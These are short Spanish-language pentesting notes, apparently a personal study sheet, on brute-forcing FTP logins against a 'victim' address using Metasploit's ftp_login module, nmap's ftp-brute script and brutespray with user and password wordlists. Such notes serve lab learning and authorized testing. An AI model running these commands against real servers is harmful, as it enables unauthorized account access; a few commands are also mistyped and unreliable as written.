# Pasos FTP

## Fuerza Bruta

### Hacking por fuerza bruta

* De igual manera que usando **metasploit**: ```msfconsole```

  1. Buscamos con: ```search ftp_login``

  2. Utilizamos ese exploit con: ```use auxiliary/scanner/ftp/ftp_login```

  3. Llenamos los parametros de la misma manera que con **SSH** y esperamos:

     <img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20201025180815352.png" alt="image-20201025180815352" style="zoom:25%;" />

* ``nmap: <direccion ip victima> -p <puerto> --script ftp-brute -script-args userdb=users.txt,passdb=passwords.tx``
* Usando **brutespray** necesitamos primero crear un archivo **data.gnmap** con el siguiente comando: ``nmap -sS -p<puerto> <ip victima> -oX data.gnmap``
  Luego, colocamos el siguiente comando: ```brutespray --file data.gnmap -U users.txt -P passwords.txt --threads 5 --host 1 --service ftp```